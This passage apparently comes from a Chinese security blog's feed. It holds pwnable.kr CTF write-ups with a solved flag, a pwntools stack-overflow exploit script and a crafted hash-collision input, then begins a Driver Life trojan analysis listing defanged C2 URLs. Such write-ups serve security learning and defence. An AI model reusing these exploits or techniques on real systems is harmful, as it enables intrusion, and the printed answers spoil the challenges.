    <content type="html"><![CDATA[<p>这道题看描述是一道CTF  reverse题，主要是考验动静结合的逆向能力，不同于pwn：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810161746.png"></p><p>​    wget下载下来，顺便查看flag文件类型，为64位elf文件：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810162520.png"></p><p>​    运行后提示：I will malloc() and strcpy the flag there. take it.</p><p>​    先静态分析一下，程序被加了upx壳，</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810191238.png"></p><p>​    将其脱壳再拖入IDA分析，代码很简单一目了然，跟进flag即可拿到对应的flag为：<strong>UPX…? sounds like a delivery service</strong> </p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810192307.png"></p><p>​    这里也可以gdb动态调试一下脱壳后的样本，在strcpy处(0x401195)设置断点，然后查看esi中对应字符串内容：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810194608.png"></p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810194826.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这道题看描述是一道CTF  reverse题，主要是考验动静结合的逆向能力，不同于pwn：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810161746.png&quot;</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之03-bof</title>
    <link href="http://example.com/2021/08/13/pwnable/pwnable.kr%E7%B3%BB%E5%88%9703-bof/"/>
    <id>http://example.com/2021/08/13/pwnable/pwnable.kr%E7%B3%BB%E5%88%9703-bof/</id>
    <published>2021-08-12T16:00:00.000Z</published>
    <updated>2021-09-12T12:56:12.754Z</updated>
    
    <content type="html"><![CDATA[<p>  通过该题的下载链接下载到源码和编译后的程序，提示如下： </p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability.</span><br><span class="line">Is that true?</span><br><span class="line"> </span><br><span class="line">Download : http://pwnable.kr/bin/bof</span><br><span class="line">Download : http://pwnable.kr/bin/bof.c</span><br><span class="line"> </span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure><p>​    题目代码如下 bof.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">    gets(overflowme);    <span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    是一个很简单的栈溢出漏洞，把key的值替换为0xcagebabe即可成功flag，但是第一次使用gdb+pwotools来做题时，还是对一些分析流程以及偏移的计算不太熟练，尝试了很多次。</p><p>​    拿到程序先用checksec来查看一下启用的保护，因为是练手程序，所以基本上所有保护都被关闭了，只开启了RELRO(只读保护)，对栈利用无影响:</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn20210729180341.png"></p><p>接下来就是调试算偏移，file加载bof到gdb，break func对存在溢出点的函数下断，run执行，成功断到func入口处，有两种算偏移的方法，如果熟悉汇编代码可以直接通过disassemble对func函数反编译，通过代码计算栈偏移即可，反编译后代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function func:</span><br><span class="line">&#x3D;&gt; 0x080491f6 &lt;+0&gt;:    endbr32</span><br><span class="line">   0x080491fa &lt;+4&gt;:    push   ebp</span><br><span class="line">   0x080491fb &lt;+5&gt;:    mov    ebp,esp</span><br><span class="line">   0x080491fd &lt;+7&gt;:    push   ebx</span><br><span class="line">   0x080491fe &lt;+8&gt;:    sub    esp,0x24</span><br><span class="line">   0x08049201 &lt;+11&gt;:    call   0x8049130 &lt;__x86.get_pc_thunk.bx&gt;</span><br><span class="line">   0x08049206 &lt;+16&gt;:    add    ebx,0x2dfa</span><br><span class="line">   0x0804920c &lt;+22&gt;:    sub    esp,0xc</span><br><span class="line">   0x0804920f &lt;+25&gt;:    lea    eax,[ebx-0x1ff8]</span><br><span class="line">   0x08049215 &lt;+31&gt;:    push   eax</span><br><span class="line">   0x08049216 &lt;+32&gt;:    call   0x8049090 &lt;printf@plt&gt;</span><br><span class="line">   0x0804921b &lt;+37&gt;:    add    esp,0x10</span><br><span class="line">   0x0804921e &lt;+40&gt;:    sub    esp,0xc</span><br><span class="line">   0x08049221 &lt;+43&gt;:    lea    eax,[ebp-0x28]</span><br><span class="line">   0x08049224 &lt;+46&gt;:    push   eax</span><br><span class="line">   0x08049225 &lt;+47&gt;:    call   0x80490a0 &lt;gets@plt&gt;</span><br><span class="line">   0x0804922a &lt;+52&gt;:    add    esp,0x10</span><br><span class="line">   0x0804922d &lt;+55&gt;:    cmp    DWORD PTR [ebp+0x8],0xcafebabe</span><br><span class="line">   0x08049234 &lt;+62&gt;:    jne    0x804924a &lt;func+84&gt;</span><br><span class="line">   0x08049236 &lt;+64&gt;:    sub    esp,0xc</span><br><span class="line">   0x08049239 &lt;+67&gt;:    lea    eax,[ebx-0x1fe9]</span><br><span class="line">   0x0804923f &lt;+73&gt;:    push   eax</span><br><span class="line">   0x08049240 &lt;+74&gt;:    call   0x80490c0 &lt;system@plt&gt;</span><br><span class="line">   0x08049245 &lt;+79&gt;:    add    esp,0x10</span><br><span class="line">   0x08049248 &lt;+82&gt;:    jmp    0x804925c &lt;func+102&gt;</span><br><span class="line">   0x0804924a &lt;+84&gt;:    sub    esp,0xc</span><br><span class="line">   0x0804924d &lt;+87&gt;:    lea    eax,[ebx-0x1fe1]</span><br><span class="line">   0x08049253 &lt;+93&gt;:    push   eax</span><br><span class="line">   0x08049254 &lt;+94&gt;:    call   0x80490b0 &lt;puts@plt&gt;</span><br><span class="line">   0x08049259 &lt;+99&gt;:    add    esp,0x10</span><br><span class="line">   0x0804925c &lt;+102&gt;:    nop</span><br><span class="line">   0x0804925d &lt;+103&gt;:    mov    ebx,DWORD PTR [ebp-0x4]</span><br><span class="line">   0x08049260 &lt;+106&gt;:    leave</span><br><span class="line">   0x08049261 &lt;+107&gt;:    ret  </span><br><span class="line">End of assembler dump.</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>​    可以看出来，要覆盖的key在ebp+0x8处，gets获取的字符串存储位置从ebp-0x28处开始，也就是偏移为0x30</p><p>​    也可以通过对gets前下断，c运行到断点处，n继续运行键入AAAA作为标记然后查看内存来算出偏移。</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn20210730104415.png"></p><p><strong>使用pwntool进行远程漏洞利用</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    c = remote(<span class="string">&quot;pwnable.kr&quot;</span>,<span class="number">9000</span>)</span><br><span class="line">    c.sendline(<span class="built_in">bytes</span>(<span class="string">&quot;A&quot;</span>,<span class="string">&#x27;latin-1&#x27;</span>)*<span class="number">0x30</span>+p32(<span class="number">0xcafebabe</span>))</span><br><span class="line">    c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  通过该题的下载链接下载到源码和编译后的程序，提示如下： &lt;/p&gt;
&lt;figure class=&quot;highlight txt&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span </summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之02-collision</title>
    <link href="http://example.com/2021/08/12/pwnable/pwnable.kr%E7%B3%BB%E5%88%9702-collision/"/>
    <id>http://example.com/2021/08/12/pwnable/pwnable.kr%E7%B3%BB%E5%88%9702-collision/</id>
    <published>2021-08-11T16:00:00.000Z</published>
    <updated>2021-09-12T12:56:06.095Z</updated>
    
    <content type="html"><![CDATA[<p> 第二题，是一道关于MD5 hash碰撞的 题目，使用ssh链接，题目详情如下:</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210806170420.png"></p><p>​    先链接上看看，密码guest：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210806171452.png"></p><p>​    还是熟悉的几个文件，col.c是包含漏洞的源码、col为编译后的文件、flag是我们要读取的文件。当前用户col对于flag依旧没有读写权限，要读取flag内容，观察col_pwn就可以发现原理和fd依旧相同，这里直接分析col.c既可，其源代码内容如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">        res += ip[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><ol><li>得到flag的前提是argv[1]经过运算后，能够和hashcode对应的值0x21DD09EC相匹配</li><li>argv[1]作为参数1，大小为20字节</li><li>check_password进行hash运算，函数将20字节的argv[1]拆分位一个int[5]数组进行累加运算</li></ol><p>综上，这里只需要找到一组int[5]来满足累加运算后值为0x21DD09EC即可成功破解。</p><p>​    这里可以考虑写程序暴力枚举破解，但对于这个简单的算法其实没必要，只需要保证五个四字节大小的数相加为hashcode即可，那么可以让前4个四字节数都为同一个值也就是参数的前16个字节都相同，比如设为0x0(这里不能为0x00，应为0x00会截断参数输入，其它任何数都可以)，那么最后一个四字节数就可以通过0x21DD09EC-0x05050505*4算出来为0x0DC8F5D8。</p><p>​    输入参数需要手动键入的话，很多非字母、数字和符号的ASCII字符是打不出来的，这就需要掌握点技巧，一个方法就是使用python这样的脚本对字符进行输出然后直接作为参数进行漏洞程序执行。使用python构建参数为如下形式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`python2 -c <span class="string">&quot;print &#x27;\x05\x05\x05\x05&#x27;*0x4+&#x27;\xd8\xf5\xc8\x0d&#x27;&quot;</span>`</span><br></pre></td></tr></table></figure><p>​    然后我们进行验证，python2成功flag，这里不建议使用python3：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210810145648.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; 第二题，是一道关于MD5 hash碰撞的 题目，使用ssh链接，题目详情如下:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210806170420.png&quot;&gt;&lt;/p&gt;</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.kr系列刷题之01-fd</title>
    <link href="http://example.com/2021/08/11/pwnable/pwnable.kr%E7%B3%BB%E5%88%9701-fd/"/>
    <id>http://example.com/2021/08/11/pwnable/pwnable.kr%E7%B3%BB%E5%88%9701-fd/</id>
    <published>2021-08-10T16:00:00.000Z</published>
    <updated>2021-09-12T12:55:39.591Z</updated>
    
    <content type="html"><![CDATA[<p><strong>题目：</strong></p><p>​    该题是第一道题，通过描述来看是和Linux描述符相关的题目，如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210730162821.png"></p><p>​    首先使用ssh远程链接linux服务器，括号中为密码guest，链接后如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210730163010.png"></p><p>​    查看文件，其中用于登录的fd用户，对于flag并无任何读写权限，而可以可能到fd对于fd.c具有读取权限，所以我们可以查看fd.c的代码进行漏洞利用来获取flag信息：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210730170620.png"></p><p>​    fd.c代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">    len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析：</p><ol><li> fd通过参数(argv[1])-0x1234来计算得到</li><li> fd控制read读取到buf的内容，read函数限定了向buf中写入的内容为32字节，没有利用的可能</li><li> 通过buf的内容和”LERMEWIN”做比较来cat flag得到flag内容，这里存在一个问题，刚才看到权限的时候，flag并没有权限去读取，为什么运行fd之后，就可以cat flag了。这是应为fd和flag都有着同个所有用户fd_pwn，当fd运行起来后，其本身对应的权限就临时会变为fd_pwn，而fd_pwn对于flag是有读取权限的，所以就可以cat flag了。</li></ol><p> <strong>文件描述符</strong></p><p>参考<a href="https://zhuanlan.zhihu.com/p/376099115">Linux 下 C/C++ 输入输出</a></p><p>​    观察代码，这里在分析前需要先了解点Linux下文件描述符的知识，在Linux下启动一个程序时，会打开三个文件描述符0、1、2，Linux内核会管理文件描述符及其背后的文件是什么，所以可以使用<strong>系统调用</strong><code>read/write</code>往0、1、2这三个文件描述符里读取/写入内容，这三个文件描述符一般都会链接到终端屏幕上。可以在终端数如tty命令来查看自己终端所绑定的输出位置，也可以使用<code>ls -l /proc/进程pid/fd</code>来查看具体进程打开的所有fd，可以看到很多程序的并没有链接到终端中，而是连接到了文件/套接字中。单无论是输入/输出, 其最终都是要通过系统调用, 读取 0 号 fd, 或者写入 1/2 号 fd。</p><p>​    在C标准输入输出中，为了尽可能不进行系统调用，大佬们想出了缓存，也就是常说的<code>stdin</code>、<code>stdout</code>、<code>stderr</code>，这三个东西在C标准库中实现，实际上对应的是<code>FILE*</code>，分别指向了C标准库种得<code>_IO_2_1_stdin_, _IO_2_1_stdout_, _IO_2_1_stderr_</code>这三个FILE，这三个FILE主要就是用来负责管理缓存然后在需要的时候进行<code>read/write</code>系统调用，得到新的输入或者进行真正的输出。</p><p><strong>继续分析：</strong></p><p>​    了解了文件描述符的知识后，我们继续看fd程序，可以发现要拿到flag的前提是buf内容为LETEMEWIN，而我们唯一能控制输入的地方在控制台，所以read用到的fd就需要代表终端才能将需要的内容写入buf。所以就要使得fd为stdin也就是0，那么第一个参数argv[1]就要为0x1234也就是字符串”4006”。</p><p>​    分析完毕后进行验证，成功得到flg：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210805182143.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;题目：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;​    该题是第一道题，通过描述来看是和Linux描述符相关的题目，如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnab</summary>
      
    
    
    
    <category term="pwn" scheme="http://example.com/categories/pwn/"/>
    
    
    <category term="pwnable.kr" scheme="http://example.com/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>谈一谈驱动人生木马</title>
    <link href="http://example.com/2021/03/06/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E8%B0%88%E4%B8%80%E8%B0%88%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC/"/>
    <id>http://example.com/2021/03/06/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E8%B0%88%E4%B8%80%E8%B0%88%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F%E6%9C%A8%E9%A9%AC/</id>
    <published>2021-03-05T16:00:00.000Z</published>
    <updated>2021-10-29T08:49:57.333Z</updated>
    
    <content type="html"><![CDATA[<p>​    本文是作者在奇安信威胁情报中心公众号发布的文章<a href="https://mp.weixin.qq.com/s/mMi5fHtBPuN09uH6FKm0_g">永恒的对手：永恒之蓝挖矿木马的前世今生</a>，这里在个人博客做个记录。</p><h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><p>​    “驱动人生”劫持木马是在18年12月份爆发的一次攻击，木马团伙通过劫持驱动人生升级服务器下发该木马致使大量客户中招。此木马近年来一直处于活跃状态，攻击、传播手法持续更新。在进行客户侧应急时，我们经常会遇到该系列木马，由于该木马使用的攻击与传播手段基本覆盖了常见的各种方法，此木马在内网的流行程度反而在一定程度上反映了一个网络的安全性，甚至可以用来作为指标来评估内网的安全程度。</p><p>​    鉴于此种情况，我们认为有必要对“永恒之蓝木马下载器”(由于病毒发展，逐步脱离了最初得驱动人生模块，后文都用此称呼来描述)进行一个总结性的整理，本文从该木马功能演进角度出发，说明了各个时间点木马的特性并对木马中的各个模块进行了一个简单的分析。</p><h2 id="00-时间线梳理"><a href="#00-时间线梳理" class="headerlink" title="00 时间线梳理"></a>00 时间线梳理</h2><p>​    对“永恒之蓝木马下载器”系列木马更新时间线进行整理如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153054.png"></p><h1 id="2-最初的攻击方式"><a href="#2-最初的攻击方式" class="headerlink" title="2. 最初的攻击方式"></a>2. 最初的攻击方式</h1><p>​    2018年12月14日，“永恒之蓝木马下载器”攻击爆发，攻击者利用驱动人生团队外出团建的时机，开始了一次蓄谋已久的恶意活动。其利用前期已掌握到的信息，在14日下午劫持了驱动人生公司的升级服务器，修改了服务器中负责升级的配置文件ServiceConfig.xml，利用该配置文件中的存储的SQL数据库IP和密码登陆到SQL数据库并向其中插入了恶意下载链接：</p><p><code>hxxp://pull[.]update[.]ackng[.]com/ </code></p><p>​    从而实现劫持人生日历、USB宝盒、160压缩、160Wifi等软件的升级通道，进而可以进行恶意程序分发。</p><p>​    此次攻击是一次典型的供应链攻击事件，据监测从攻击爆发开始，仅仅两个小时中招用户就达到了10万的高峰，其恶意代码具体的分发流程如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153454.png"></p><p>​    此时下载到的恶意木马主要被用于释放挖矿与远控的加载器、下载内网横向传播模块等，横向传播使用了经典的“永恒之蓝”漏洞。最初Payload的下载地址为：</p><p><code>hxxp://dl[.]haqo[.]net/</code></p><p>​    目前已知从该地址下载到的文件名为：dl.exe、dll.exe、eb.exez、updater等。</p><p>​    对于中招的机器，则会执行bat命令尝试进行横向移动 。</p><p>​    最初的攻击链中，更新程序DTLUpg.exe从如下形式的C2下载第一阶段Payload：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hxxp://pull[.]update[.]ackng[.]com/ziptool/PullExecute/F79CB9D2893B254CC75DFB7F3E454A69.exe    hxxp://pull[.]update[.]ackng[.]com/160wifibroad/pullexecute/f79cb9d2893b254cc75dfb7f3e454a69.exe</span><br><span class="line">………………</span><br></pre></td></tr></table></figure><p>​    劫持后不同URL仅仅对应驱动人生系列的不同产品，最终均为同一个恶意程序。该阶段恶意程序执行流程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153629.png"></p><h2 id="00-木马主体分析"><a href="#00-木马主体分析" class="headerlink" title="00 木马主体分析"></a>00 木马主体分析</h2><p>​    病毒文件f79cb9d2893b254cc75dfb7f3e454a69.exe一般被下载释放在C:\Program File\DTLSoft\Updater\ctrlf路径下，主要行为如下：</p><ol><li>将自身拷贝到System32(SysWOW64)下，命名为svhost.exe(即C:\Windows\System32\svhost.exe)，并安装为服务，服务名为”Ddriver”：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153750.png"></p><p>​    启动服务：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153805.png"></p><ol start="2"><li><p>作为服务运行后，进入注册函数执行，主要完成了对于远控模块svhhost.exe的释放和拉取，以及对于攻击模块svvhost.exe的下载和执行，具体细节如下：</p><ul><li>创建互斥体”it is holy shit”，检测是否重复启动服务进行感染：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153915.png"></p><ul><li>将资源中的”zip”下的PE文件释放为System32(SysWOW64)下的svhhost.exe，即远控模块：</li></ul><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029153944.png"></p><p>​    svhost.exe的资源如下所示,PE信息被明文存储：</p><p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E9%A9%B1%E5%8A%A8%E4%BA%BA%E7%94%9F20211029154008.png"></p><ul><li>在svhhost.exe中创建互斥体防止多开：</li></ul><p><img 